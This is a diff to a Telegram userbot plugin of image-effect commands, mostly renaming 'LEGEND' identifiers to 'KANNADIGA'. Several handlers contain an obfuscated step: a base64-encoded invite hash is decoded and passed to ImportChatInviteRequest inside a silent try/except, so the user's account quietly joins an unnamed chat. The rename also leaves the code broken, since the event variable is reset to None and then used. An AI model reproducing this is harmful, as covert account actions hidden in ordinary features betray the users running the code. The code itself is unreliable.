@@ -90,8 +90,8 @@ async def dc(event):
     link = f"https://telegra.ph{url[0]}"
     hmm = f"https://some-random-api.ml/canvas/triggered?avatar={link}"
     r = requests.get(hmm)
-    open("legend.gif", "wb").write(r.content)
-    hehe = "legend.gif"
+    open("KANNADIGA.gif", "wb").write(r.content)
+    hehe = "KANNADIGA.gif"
     await bot.send_file(event.chat_id, hehe, caption="Got Triggered 😈😂", reply_to=dc)
     for files in (hehe, img):
         if files and os.path.exists(files):
@@ -115,8 +115,8 @@ async def dc(event):
     link = f"https://telegra.ph{url[0]}"
     hmm = f"https://some-random-api.ml/canvas/wasted?avatar={link}"
     r = requests.get(hmm)
-    open("legend.png", "wb").write(r.content)
-    hehe = "legend.png"
+    open("KANNADIGA.png", "wb").write(r.content)
+    hehe = "KANNADIGA.png"
     await bot.send_file(event.chat_id, hehe, caption="Totally wasted⚰️ 😒", reply_to=dc)
     for files in (hehe, img):
         if files and os.path.exists(files):
@@ -140,8 +140,8 @@ async def dc(event):
     link = f"https://telegra.ph{url[0]}"
     hehe = f"https://some-random-api.ml/canvas/greyscale?avatar={link}"
     r = requests.get(hehe)
-    open("legend.png", "wb").write(r.content)
-    hehe = "legend.png"
+    open("KANNADIGA.png", "wb").write(r.content)
+    hehe = "KANNADIGA.png"
     await bot.send_file(
         event.chat_id, hehe, caption="Ur Black nd White img here 🙃", reply_to=dc
     )
@@ -151,7 +151,7 @@ async def dc(event):
     await event.delete()
 
 
-# legend
+# KANNADIGA
 
 
 @bot.on(admin_cmd(pattern=r"blur"))
@@ -170,8 +170,8 @@ async def dc(event):
     link = f"https://telegra.ph{url[0]}"
     hehe = f"https://some-random-api.ml/canvas/blur?avatar={link}"
     r = requests.get(hehe)
-    open("legend.png", "wb").write(r.content)
-    hehe = "legend.png"
+    open("KANNADIGA.png", "wb").write(r.content)
+    hehe = "KANNADIGA.png"
     await bot.send_file(event.chat_id, hehe, caption="Blured 🤓", reply_to=dc)
     for files in (hehe, img):
         if files and os.path.exists(files):
@@ -195,8 +195,8 @@ async def dc(event):
     link = f"https://telegra.ph{url[0]}"
     hehe = f"https://some-random-api.ml/canvas/invert?avatar={link}"
     r = requests.get(hehe)
-    open("legend.png", "wb").write(r.content)
-    hehe = "legend.png"
+    open("KANNADIGA.png", "wb").write(r.content)
+    hehe = "KANNADIGA.png"
     await bot.send_file(
         event.chat_id, hehe, caption="Hmm 🤔 try to invert again", reply_to=dc
     )
@@ -222,15 +222,15 @@ async def dc(event):
     link = f"https://telegra.ph{url[0]}"
     hehe = f"https://some-random-api.ml/canvas/invertgreyscale?avatar={link}"
     r = requests.get(hehe)
-    open("legend.png", "wb").write(r.content)
-    hehe = "legend.png"
+    open("KANNADIGA.png", "wb").write(r.content)
+    hehe = "KANNADIGA.png"
     await bot.send_file(event.chat_id, hehe, reply_to=dc)
     for files in (hehe, img):
         if files and os.path.exists(files):
             os.remove(files)
     await event.delete()
 
-    # legend
+    # KANNADIGA
 
 
 @bot.on(admin_cmd(pattern=r"bright"))
@@ -249,8 +249,8 @@ async def dc(event):
     link = f"https://telegra.ph{url[0]}"
     hehe = f"https://some-random-api.ml/canvas/brightness?avatar={link}"
     r = requests.get(hehe)
-    open("legend.png", "wb").write(r.content)
-    hehe = "legend.png"
+    open("KANNADIGA.png", "wb").write(r.content)
+    hehe = "KANNADIGA.png"
     await bot.send_file(
         event.chat_id, hehe, caption="Brightness increased 😎😎", reply_to=dc
     )
@@ -259,7 +259,7 @@ async def dc(event):
             os.remove(files)
     await event.delete()
 
-    # legend
+    # KANNADIGA
 
 
 @bot.on(admin_cmd(pattern=r"ytc"))
@@ -285,8 +285,8 @@ async def hehe(event):
     imglink = f"https://telegra.ph{url_s[0]}"
     nikal = f"https://some-random-api.ml/canvas/youtube-comment?avatar={imglink}&comment={comment}&username={username}"
     r = requests.get(nikal)
-    open("legend.png", "wb").write(r.content)
-    chutiya = "legend.png"
+    open("KANNADIGA.png", "wb").write(r.content)
+    chutiya = "KANNADIGA.png"
     await bot.send_file(event.chat_id, chutiya, reply_to=dc)
     for files in (chutiya, img):
         if files and os.path.exists(files):
@@ -294,7 +294,7 @@ async def hehe(event):
 
     await event.delete()
 
-    # legend
+    # KANNADIGA
 
 
 @bot.on(admin_cmd(pattern=r"glass"))
@@ -313,8 +313,8 @@ async def dc(event):
     link = f"https://telegra.ph{url[0]}"
     hehe = f"https://some-random-api.ml/canvas/glass?avatar={link}"
     r = requests.get(hehe)
-    open("legend.png", "wb").write(r.content)
-    hehe = "legend.png"
+    open("KANNADIGA.png", "wb").write(r.content)
+    hehe = "KANNADIGA.png"
     await bot.send_file(
         event.chat_id, hehe, caption="Wow Image Trapped Under the glass 😂", reply_to=dc
     )
@@ -322,7 +322,7 @@ async def dc(event):
         if files and os.path.exists(files):
             os.remove(files)
     await event.delete()
-    # legend
+    # KANNADIGA
 
 
 @bot.on(admin_cmd(pattern=r"blrpl"))
@@ -341,8 +341,8 @@ async def dc(event):
     link = f"https://telegra.ph{url[0]}"
     hehe = f"https://some-random-api.ml/canvas/blurple?avatar={link}"
     r = requests.get(hehe)
-    open("legend.png", "wb").write(r.content)
-    hehe = "legend.png"
+    open("KANNADIGA.png", "wb").write(r.content)
+    hehe = "KANNADIGA.png"
     await bot.send_file(event.chat_id, hehe, reply_to=dc)
     for files in (hehe, img):
         if files and os.path.exists(files):
@@ -396,557 +396,557 @@ async def autopic(event):
 
 @bot.on(admin_cmd(pattern="invert$", outgoing=True))
 @bot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(KANNADIGA):
+    if KANNADIGA.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await KANNADIGA.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(KANNADIGA, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    KANNADIGAid = KANNADIGA.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    KANNADIGA = await edit_or_reply(KANNADIGA, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    KANNADIGAsticker = await reply.download_media(file="./temp/")
+    if not KANNADIGAsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(KANNADIGAsticker)
+        await edit_or_reply(KANNADIGA, "```Supported Media not found...```")
         return
     import base64
 
-    legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    KANNADIGA = None
+    if KANNADIGAsticker.endswith(".tgs"):
+        await KANNADIGA.edit(
             "Analyzing this media 🧐  inverting colors of this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        KANNADIGAfile = os.path.join("./temp/", "meme.png")
+        KANNADIGAcmd = f"lottie_convert.py --frame 0 -if lottie -of png {KANNADIGAsticker} {KANNADIGAfile}"
+        stdout, stderr = (await runcmd(KANNADIGAcmd))[:2]
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
-        legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit("`Analyzing this media 🧐 inverting colors...`")
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
+    elif KANNADIGAsticker.endswith(".webp"):
+        await KANNADIGA.edit("`Analyzing this media 🧐 inverting colors...`")
+        KANNADIGAfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(KANNADIGAsticker, KANNADIGAfile)
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
-        legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit("Analyzing this media 🧐 inverting colors of this video!")
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
+    elif KANNADIGAsticker.endswith((".mp4", ".mov")):
+        await KANNADIGA.edit("Analyzing this media 🧐 inverting colors of this video!")
+        KANNADIGAfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(KANNADIGAsticker, 0, KANNADIGAfile)
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
-        legend = True
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
     else:
-        await LEGEND.edit("Analyzing this media 🧐 inverting colors of this image!")
-        meme_file = LEGENDsticker
+        await KANNADIGA.edit("Analyzing this media 🧐 inverting colors of this image!")
+        meme_file = KANNADIGAsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await KANNADIGA.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "invert.webp" if legend else "invert.jpg"
+    outputfile = "invert.webp" if KANNADIGA else "invert.jpg"
     await invert_colors(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await KANNADIGA.client.send_file(
+        KANNADIGA.chat_id, outputfile, force_document=False, reply_to=KANNADIGAid
     )
-    await LEGEND.delete()
+    await KANNADIGA.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (KANNADIGAsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @bot.on(admin_cmd(outgoing=True, pattern="solarize$"))
 @bot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(KANNADIGA):
+    if KANNADIGA.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await KANNADIGA.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(KANNADIGA, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    KANNADIGAid = KANNADIGA.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    KANNADIGA = await edit_or_reply(KANNADIGA, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    KANNADIGAsticker = await reply.download_media(file="./temp/")
+    if not KANNADIGAsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(KANNADIGAsticker)
+        await edit_or_reply(KANNADIGA, "```Supported Media not found...```")
         return
     import base64
 
-    legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit("Analyzing this media 🧐 solarizeing this animated sticker!")
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+    KANNADIGA = None
+    if KANNADIGAsticker.endswith(".tgs"):
+        await KANNADIGA.edit("Analyzing this media 🧐 solarizeing this animated sticker!")
+        KANNADIGAfile = os.path.join("./temp/", "meme.png")
+        KANNADIGAcmd = f"lottie_convert.py --frame 0 -if lottie -of png {KANNADIGAsticker} {KANNADIGAfile}"
+        stdout, stderr = (await runcmd(KANNADIGAcmd))[:2]
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
-        legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit("Analyzing this media 🧐 solarizeing this sticker!")
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
+    elif KANNADIGAsticker.endswith(".webp"):
+        await KANNADIGA.edit("Analyzing this media 🧐 solarizeing this sticker!")
+        KANNADIGAfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(KANNADIGAsticker, KANNADIGAfile)
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
-        legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit("Analyzing this media 🧐 solarizeing this video!")
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
+    elif KANNADIGAsticker.endswith((".mp4", ".mov")):
+        await KANNADIGA.edit("Analyzing this media 🧐 solarizeing this video!")
+        KANNADIGAfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(KANNADIGAsticker, 0, KANNADIGAfile)
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
-        legend = True
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
     else:
-        await LEGEND.edit("Analyzing this media 🧐 solarizeing this image!")
-        meme_file = LEGENDsticker
+        await KANNADIGA.edit("Analyzing this media 🧐 solarizeing this image!")
+        meme_file = KANNADIGAsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await KANNADIGA.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "solarize.webp" if legend else "solarize.jpg"
+    outputfile = "solarize.webp" if KANNADIGA else "solarize.jpg"
     await solarize(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await KANNADIGA.client.send_file(
+        KANNADIGA.chat_id, outputfile, force_document=False, reply_to=KANNADIGAid
     )
-    await LEGEND.delete()
+    await KANNADIGA.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (KANNADIGAsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @bot.on(admin_cmd(outgoing=True, pattern="mirror$"))
 @bot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(KANNADIGA):
+    if KANNADIGA.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await KANNADIGA.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(KANNADIGA, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    KANNADIGAid = KANNADIGA.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    KANNADIGA = await edit_or_reply(KANNADIGA, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    KANNADIGAsticker = await reply.download_media(file="./temp/")
+    if not KANNADIGAsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(KANNADIGAsticker)
+        await edit_or_reply(KANNADIGA, "```Supported Media not found...```")
         return
     import base64
 
-    legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    KANNADIGA = None
+    if KANNADIGAsticker.endswith(".tgs"):
+        await KANNADIGA.edit(
             "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        KANNADIGAfile = os.path.join("./temp/", "meme.png")
+        KANNADIGAcmd = f"lottie_convert.py --frame 0 -if lottie -of png {KANNADIGAsticker} {KANNADIGAfile}"
+        stdout, stderr = (await runcmd(KANNADIGAcmd))[:2]
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
-        legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
+    elif KANNADIGAsticker.endswith(".webp"):
+        await KANNADIGA.edit(
             "Analyzing this media 🧐 converting to mirror image of this sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        KANNADIGAfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(KANNADIGAsticker, KANNADIGAfile)
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
-        legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
+    elif KANNADIGAsticker.endswith((".mp4", ".mov")):
+        await KANNADIGA.edit(
             "Analyzing this media 🧐 converting to mirror image of this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        KANNADIGAfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(KANNADIGAsticker, 0, KANNADIGAfile)
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
-        legend = True
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
     else:
-        await LEGEND.edit(
+        await KANNADIGA.edit(
             "Analyzing this media 🧐 converting to mirror image of this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = KANNADIGAsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await KANNADIGA.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "mirror_file.webp" if legend else "mirror_file.jpg"
+    outputfile = "mirror_file.webp" if KANNADIGA else "mirror_file.jpg"
     await mirror_file(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await KANNADIGA.client.send_file(
+        KANNADIGA.chat_id, outputfile, force_document=False, reply_to=KANNADIGAid
     )
-    await LEGEND.delete()
+    await KANNADIGA.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (KANNADIGAsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @bot.on(admin_cmd(outgoing=True, pattern="flip$"))
 @bot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(KANNADIGA):
+    if KANNADIGA.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await KANNADIGA.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(KANNADIGA, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    KANNADIGAid = KANNADIGA.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    KANNADIGA = await edit_or_reply(KANNADIGA, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    KANNADIGAsticker = await reply.download_media(file="./temp/")
+    if not KANNADIGAsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(KANNADIGAsticker)
+        await edit_or_reply(KANNADIGA, "```Supported Media not found...```")
         return
     import base64
 
-    legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit("Analyzing this media 🧐 fliping this animated sticker!")
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+    KANNADIGA = None
+    if KANNADIGAsticker.endswith(".tgs"):
+        await KANNADIGA.edit("Analyzing this media 🧐 fliping this animated sticker!")
+        KANNADIGAfile = os.path.join("./temp/", "meme.png")
+        KANNADIGAcmd = f"lottie_convert.py --frame 0 -if lottie -of png {KANNADIGAsticker} {KANNADIGAfile}"
+        stdout, stderr = (await runcmd(KANNADIGAcmd))[:2]
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
-        legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit("Analyzing this media 🧐 fliping this sticker!")
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
+    elif KANNADIGAsticker.endswith(".webp"):
+        await KANNADIGA.edit("Analyzing this media 🧐 fliping this sticker!")
+        KANNADIGAfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(KANNADIGAsticker, KANNADIGAfile)
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
-        legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit("Analyzing this media 🧐 fliping this video!")
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
+    elif KANNADIGAsticker.endswith((".mp4", ".mov")):
+        await KANNADIGA.edit("Analyzing this media 🧐 fliping this video!")
+        KANNADIGAfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(KANNADIGAsticker, 0, KANNADIGAfile)
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
-        legend = True
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
     else:
-        await LEGEND.edit("Analyzing this media 🧐 fliping this image!")
-        meme_file = LEGENDsticker
+        await KANNADIGA.edit("Analyzing this media 🧐 fliping this image!")
+        meme_file = KANNADIGAsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await KANNADIGA.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "flip_image.webp" if legend else "flip_image.jpg"
+    outputfile = "flip_image.webp" if KANNADIGA else "flip_image.jpg"
     await flip_image(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await KANNADIGA.client.send_file(
+        KANNADIGA.chat_id, outputfile, force_document=False, reply_to=KANNADIGAid
     )
-    await LEGEND.delete()
+    await KANNADIGA.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (KANNADIGAsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @bot.on(admin_cmd(outgoing=True, pattern="gray$"))
 @bot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(KANNADIGA):
+    if KANNADIGA.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await KANNADIGA.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(KANNADIGA, "`Reply to supported Media...`")
         return
-    LEGENDid = LEGEND.reply_to_msg_id
+    KANNADIGAid = KANNADIGA.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    KANNADIGA = await edit_or_reply(KANNADIGA, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    KANNADIGAsticker = await reply.download_media(file="./temp/")
+    if not KANNADIGAsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(KANNADIGAsticker)
+        await edit_or_reply(KANNADIGA, "```Supported Media not found...```")
         return
     import base64
 
-    legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    KANNADIGA = None
+    if KANNADIGAsticker.endswith(".tgs"):
+        await KANNADIGA.edit(
             "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        KANNADIGAfile = os.path.join("./temp/", "meme.png")
+        KANNADIGAcmd = f"lottie_convert.py --frame 0 -if lottie -of png {KANNADIGAsticker} {KANNADIGAfile}"
+        stdout, stderr = (await runcmd(KANNADIGAcmd))[:2]
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
-        legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
+    elif KANNADIGAsticker.endswith(".webp"):
+        await KANNADIGA.edit(
             "Analyzing this media 🧐 changing to black-and-white this sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        KANNADIGAfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(KANNADIGAsticker, KANNADIGAfile)
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
-        legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
+    elif KANNADIGAsticker.endswith((".mp4", ".mov")):
+        await KANNADIGA.edit(
             "Analyzing this media 🧐 changing to black-and-white this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        KANNADIGAfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(KANNADIGAsticker, 0, KANNADIGAfile)
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
-        legend = True
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
     else:
-        await LEGEND.edit(
